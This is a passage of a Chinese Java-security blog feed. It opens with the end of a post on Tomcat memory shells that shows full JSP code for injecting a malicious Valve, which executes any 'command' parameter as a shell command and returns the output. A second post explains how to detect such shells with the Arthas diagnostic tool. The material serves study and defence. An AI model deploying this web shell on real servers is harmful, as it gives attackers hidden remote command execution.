class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">testEvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">      <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;command&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">          isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;command&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;command&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">  requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">  standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">testEvilValve</span>());</span><br><span class="line">  out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164109133.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130164109133.png" alt="img"></a></p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164219944.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130164219944.png" alt="img"></a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908012707752.png" alt="image-20250908012707752"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Tomcat-容器&quot;&gt;&lt;a href=&quot;#Tomcat-容器&quot; class=&quot;headerlink&quot; title=&quot;Tomcat 容器&quot;&gt;&lt;/a&gt;Tomcat 容器&lt;/h2&gt;&lt;p&gt;Tomcat 设计了四种容器，分别是Engine、Host、Context和Wrap</summary>
      
    
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Arthas在内存马查杀中的应用</title>
    <link href="https://250wuyifan.github.io/2025/09/06/Arthas%E5%9C%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://250wuyifan.github.io/2025/09/06/Arthas%E5%9C%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2025-09-06T12:31:42.000Z</published>
    <updated>2025-09-09T17:53:30.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Arthas介绍"><a href="#Arthas介绍" class="headerlink" title="Arthas介绍"></a>Arthas介绍</h1><p><a href="https://github.com/alibaba/arthas/blob/master/README_CN.md">README</a>  </p><p><a href="https://arthas.aliyun.com/doc/quick-start.html">快速入门</a></p><p>Arthas 是阿里巴巴开源的一款<strong>强大的 Java 应用诊断工具</strong>，深受开发者尤其是 Java 后端和运维人员的喜爱。它本质上是一个在线 JVM 监控、分析和诊断的平台，可以帮助你在不重启服务的情况下，快速定位和解决线上的各种性能、功能问题。</p><p>你可以把它想象成是 <strong>Java 应用的“听诊器”或“手术刀”</strong>。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906203847377.png" alt="image-20250906203847377"></p><h1 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h1><p>可以通过下面的方式自己动手实践，也可以通过我们的<a href="https://arthas.aliyun.com/doc/arthas-tutorials.html?language=cn&id=arthas-basics">在线教程</a>，跟随教程快速入门。</p><h2 id="1-启动-math-game"><a href="#1-启动-math-game" class="headerlink" title="1. 启动 math-game"></a>1. 启动 math-game</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://arthas.aliyun.com/math-game.jar</span><br><span class="line">java -jar math-game.jar</span><br></pre></td></tr></table></figure><p><code>math-game</code>是一个简单的程序，每隔一秒生成一个随机数，再执行质因数分解，并打印出分解结果。</p><p><code>math-game</code>源代码：<a href="https://github.com/alibaba/arthas/blob/master/math-game/src/main/java/demo/MathGame.java">查看</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204426294.png" alt="image-20250906204426294"></p><h2 id="2-启动-arthas"><a href="#2-启动-arthas" class="headerlink" title="2. 启动 arthas"></a>2. 启动 arthas</h2><p>在命令行下面执行（使用和目标进程一致的用户启动，否则可能 attach 失败）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://arthas.aliyun.com/arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure><ul><li>执行该程序的用户需要和目标进程具有相同的权限。比如以<code>admin</code>用户来执行：<code>sudo su admin &amp;&amp; java -jar arthas-boot.jar</code> 或 <code>sudo -u admin -EH java -jar arthas-boot.jar</code>。</li><li>如果 attach 不上目标进程，可以查看<code>~/logs/arthas/</code> 目录下的日志。</li><li>如果下载速度比较慢，可以使用 aliyun 的镜像：<code>java -jar arthas-boot.jar --repo-mirror aliyun --use-http</code></li><li><code>java -jar arthas-boot.jar -h</code> 打印更多参数信息。</li></ul><p>选择应用 java 进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ $ java -jar arthas-boot.jar</span><br><span class="line">* [1]: 35542</span><br><span class="line">  [2]: 71560 math-game.jar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204402361.png" alt="image-20250906204402361"></p><p><code>math-game</code>进程是第 1 个，则输入 1，再输入<code>回车/enter</code>。Arthas 会 attach 到目标进程上，并输出日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Try to attach process 71560</span><br><span class="line">[INFO] Attach process 71560 success.</span><br><span class="line">[INFO] arthas-client connect 127.0.0.1 3658</span><br><span class="line">  ,---.  ,------. ,--------.,--.  ,--.  ,---.   ,---.</span><br><span class="line"> /  O  \ |  .--. <span class="string">&#x27;&#x27;</span>--.  .--<span class="string">&#x27;|  &#x27;</span>--<span class="string">&#x27;  | /  O  \ &#x27;</span>   .-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|  .-.  ||  &#x27;</span>--<span class="string">&#x27;.&#x27;</span>   |  |   |  .--.  ||  .-.  |`.  `-.</span><br><span class="line">|  | |  ||  |\  \    |  |   |  |  |  ||  | |  |.-<span class="string">&#x27;    |</span></span><br><span class="line"><span class="string">`--&#x27;</span> `--<span class="string">&#x27;`--&#x27;</span> <span class="string">&#x27;--&#x27;</span>   `--<span class="string">&#x27;   `--&#x27;</span>  `--<span class="string">&#x27;`--&#x27;</span> `--<span class="string">&#x27;`-----&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wiki: https://arthas.aliyun.com/doc</span><br><span class="line">version: 3.0.5.20181127201536</span><br><span class="line">pid: 71560</span><br><span class="line"><span class="keyword">time</span>: 2018-11-28 19:16:24</span><br><span class="line"></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204520108.png" alt="image-20250906204520108"></p><h2 id="3-查看-dashboard"><a href="#3-查看-dashboard" class="headerlink" title="3. 查看 dashboard"></a>3. 查看 dashboard</h2><p>输入<a href="https://arthas.aliyun.com/doc/dashboard.html">dashboard</a>，按<code>回车/enter</code>，会展示当前进程的信息，按<code>ctrl+c</code>可以中断执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ dashboard</span><br><span class="line">ID     NAME                   GROUP          PRIORI STATE  %CPU    TIME   INTERRU DAEMON</span><br><span class="line">17     pool-2-thread-1        system         5      WAITIN 67      0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">27     Timer-for-arthas-dashb system         10     RUNNAB 32      0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">11     AsyncAppender-Worker-a system         9      WAITIN 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">9      Attach Listener        system         9      RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">3      Finalizer              system         8      WAITIN 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">2      Reference Handler      system         10     WAITIN 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">4      Signal Dispatcher      system         9      RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">26     as-command-execute-dae system         10     TIMED_ 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">13     job-timeout            system         9      TIMED_ 0       0:0    <span class="literal">false</span>   <span class="literal">true</span></span><br><span class="line">1      main                   main           5      TIMED_ 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">14     nioEventLoopGroup-2-1  system         10     RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">18     nioEventLoopGroup-2-2  system         10     RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">23     nioEventLoopGroup-2-3  system         10     RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">15     nioEventLoopGroup-3-1  system         10     RUNNAB 0       0:0    <span class="literal">false</span>   <span class="literal">false</span></span><br><span class="line">Memory             used   total max    usage GC</span><br><span class="line">heap               32M    155M  1820M  1.77% gc.ps_scavenge.count  4</span><br><span class="line">ps_eden_space      14M    65M   672M   2.21% gc.ps_scavenge.time(m 166</span><br><span class="line">ps_survivor_space  4M     5M    5M           s)</span><br><span class="line">ps_old_gen         12M    85M   1365M  0.91% gc.ps_marksweep.count 0</span><br><span class="line">nonheap            20M    23M   -1           gc.ps_marksweep.time( 0</span><br><span class="line">code_cache         3M     5M    240M   1.32% ms)</span><br><span class="line">Runtime</span><br><span class="line">os.name                Mac OS X</span><br><span class="line">os.version             10.13.4</span><br><span class="line">java.version           1.8.0_162</span><br><span class="line">java.home              /Library/Java/JavaVir</span><br><span class="line">                       tualMachines/jdk1.8.0</span><br><span class="line">                       _162.jdk/Contents/Hom</span><br><span class="line">                       e/jre</span><br></pre></td></tr></table></figure><h2 id="4-通过-thread-命令来获取到math-game进程的-Main-Class"><a href="#4-通过-thread-命令来获取到math-game进程的-Main-Class" class="headerlink" title="4. 通过 thread 命令来获取到math-game进程的 Main Class"></a>4. 通过 thread 命令来获取到<code>math-game</code>进程的 Main Class</h2><p><code>thread 1</code>会打印线程 ID 1 的栈，通常是 main 函数的线程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ thread 1 | grep <span class="string">&#x27;main(&#x27;</span></span><br><span class="line">    at demo.MathGame.main(MathGame.java:17)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204719435.png" alt="image-20250906204719435"></p><h2 id="5-通过-jad-来反编译-Main-Class"><a href="#5-通过-jad-来反编译-Main-Class" class="headerlink" title="5. 通过 jad 来反编译 Main Class"></a>5. 通过 jad 来反编译 Main Class</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">$ jad demo.MathGame</span><br><span class="line"></span><br><span class="line">ClassLoader:</span><br><span class="line">+-sun.misc.Launcher$AppClassLoader@3d4eac69</span><br><span class="line">  +-sun.misc.Launcher$ExtClassLoader@66350f69</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line">/tmp/math-game.jar</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR 0_132.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MathGame</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">illegalArgumentCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">MathGame</span> <span class="variable">game</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MathGame</span>();</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            game.run();</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">1L</span>);</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> random.nextInt();</span><br><span class="line">            List&lt;Integer&gt; primeFactors = <span class="built_in">this</span>.primeFactors(number);</span><br><span class="line">            MathGame.print(number, primeFactors);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">&quot;illegalArgumentCount:%3d, &quot;</span>, <span class="built_in">this</span>.illegalArgumentCount) + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> number, List&lt;Integer&gt; primeFactors)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;&quot;</span> + number + <span class="string">&quot;=&quot;</span>);</span><br><span class="line">        Iterator&lt;Integer&gt; iterator = primeFactors.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">factor</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            sb.append(factor).append(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sb.charAt(sb.length() - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">primeFactors</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (number &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            ++<span class="built_in">this</span>.illegalArgumentCount;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;number is: &quot;</span> + number + <span class="string">&quot;, need &gt;= 2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= number) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number % i == <span class="number">0</span>) &#123;</span><br><span class="line">                result.add(i);</span><br><span class="line">                number /= i;</span><br><span class="line">                i = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Affect(row-cnt:<span class="number">1</span>) cost in <span class="number">970</span> ms.</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204804756.png" alt="image-20250906204804756"></p><h2 id="6-watch"><a href="#6-watch" class="headerlink" title="6. watch"></a>6. watch</h2><p>通过<a href="https://arthas.aliyun.com/doc/watch.html">watch</a>命令来查看<code>demo.MathGame#primeFactors</code>函数的返回值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ watch demo.MathGame primeFactors returnObj</span><br><span class="line">Press Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost <span class="keyword">in</span> 107 ms.</span><br><span class="line">ts=2018-11-28 19:22:30; [cost=1.715367ms] result=null</span><br><span class="line">ts=2018-11-28 19:22:31; [cost=0.185203ms] result=null</span><br><span class="line">ts=2018-11-28 19:22:32; [cost=19.012416ms] result=@ArrayList[</span><br><span class="line">    @Integer[5],</span><br><span class="line">    @Integer[47],</span><br><span class="line">    @Integer[2675531],</span><br><span class="line">]</span><br><span class="line">ts=2018-11-28 19:22:33; [cost=0.311395ms] result=@ArrayList[</span><br><span class="line">    @Integer[2],</span><br><span class="line">    @Integer[5],</span><br><span class="line">    @Integer[317],</span><br><span class="line">    @Integer[503],</span><br><span class="line">    @Integer[887],</span><br><span class="line">]</span><br><span class="line">ts=2018-11-28 19:22:34; [cost=10.136007ms] result=@ArrayList[</span><br><span class="line">    @Integer[2],</span><br><span class="line">    @Integer[2],</span><br><span class="line">    @Integer[3],</span><br><span class="line">    @Integer[3],</span><br><span class="line">    @Integer[31],</span><br><span class="line">    @Integer[717593],</span><br><span class="line">]</span><br><span class="line">ts=2018-11-28 19:22:35; [cost=29.969732ms] result=@ArrayList[</span><br><span class="line">    @Integer[5],</span><br><span class="line">    @Integer[29],</span><br><span class="line">    @Integer[7651739],</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204856815.png" alt="image-20250906204856815"></p><h2 id="7-退出-arthas"><a href="#7-退出-arthas" class="headerlink" title="7. 退出 arthas"></a>7. 退出 arthas</h2><p>如果只是退出当前的连接，可以用<code>quit</code>或者<code>exit</code>命令。Attach 到目标进程上的 arthas 还会继续运行，端口会保持开放，下次连接时可以直接连接上。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906204925793.png" alt="image-20250906204925793"></p><p>如果想完全退出 arthas，可以执行<code>stop</code>命令。</p><h2 id="8-进阶玩法"><a href="#8-进阶玩法" class="headerlink" title="8.进阶玩法"></a>8.进阶玩法</h2><p><a href="https://killercoda.com/arthas/course/arthas-tutorials-cn">https://killercoda.com/arthas/course/arthas-tutorials-cn</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205135408.png" alt="image-20250906205135408"></p><h1 id="实操实践"><a href="#实操实践" class="headerlink" title="实操实践"></a>实操实践</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先简单起一个shirodemo，<a href="https://pan.baidu.com/s/13NwfjcerdAACgGbw4qQR5w?pwd=love">下载地址</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205511360.png"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205711732.png" alt="image-20250906205711732"></p><p>然后再打一下留下一个恶意Filter</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205912133.png" alt="image-20250906205912133"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906205844355.png" alt="image-20250906205844355"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906210148642.png" alt="image-20250906210148642"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906210608387.png" alt="image-20250906210608387"></p><h2 id="使用-sc命令进行模式匹配"><a href="#使用-sc命令进行模式匹配" class="headerlink" title="使用 sc命令进行模式匹配"></a>使用 <code>sc</code>命令进行模式匹配</h2><p>在 Arthas 命令行中输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc *Filter*</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906211621067.png" alt="image-20250906211621067"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906211652392.png" alt="image-20250906211652392"></p><p><img 